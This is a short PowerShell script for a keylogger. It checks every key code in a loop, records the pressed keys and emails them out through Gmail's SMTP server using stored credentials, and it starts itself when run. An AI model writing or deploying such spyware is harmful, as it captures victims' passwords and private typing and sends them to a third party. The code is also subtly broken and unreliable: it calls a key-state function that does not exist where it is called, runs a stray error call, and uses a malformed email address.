Add-Type @"
    using System;
    using System.Runtime.InteropServices;
"@

class KeyLogger {
    [string]$log = "Key started"
    [int]$interval
    [string]$username
    [string]$password
    [string]$email

    KeyLogger([int]$time_interval, [string]$email, [string]$username, [string]$password) {
        $this.interval = $time_interval
        $this.username = $username
        $this.password = $password
        $this.email = $email
    }

    [void]Start() {
        while ($true) {
            $this.Report()
            Start-Sleep -Milliseconds $this.interval
        }
    }

    [void]AppendToLog([string]$content) {
        $this.log += $content
    }

    [void]Report() {
        for ($key = 1; $key -le 255; $key++) {
            $state = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $state = [System.Runtime.InteropServices.Marshal]::GetAsyncKeyState($key)
            if ($state -eq -32767) {
                $currentKey = [char]$key
                $this.AppendToLog($currentKey)
            }
        }

        if ($this.log.Length -gt 0) {
            $this.SendEmail("`n`n" + $this.log)
            $this.log = ""
        }
    }

    [void]SendEmail([string]$message) {
        $smtpServer = "smtp.gmail.com"
        $smtpPort = 587
        $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
        $smtp.EnableSsl = $true
        $smtp.Credentials = New-Object Net.NetworkCredential($this.username, $this.password)

        $smtp.Send($this.email, $this.email, $message)
    }
}

if ($MyInvocation.ScriptName -eq $null) {
    $kl = New-Object KeyLogger -ArgumentList 120, 'no-reply@Taylor.ChristianNewsome@OWASP.org', '[Hello]', '[Hello]'
    $kl.Start()
}
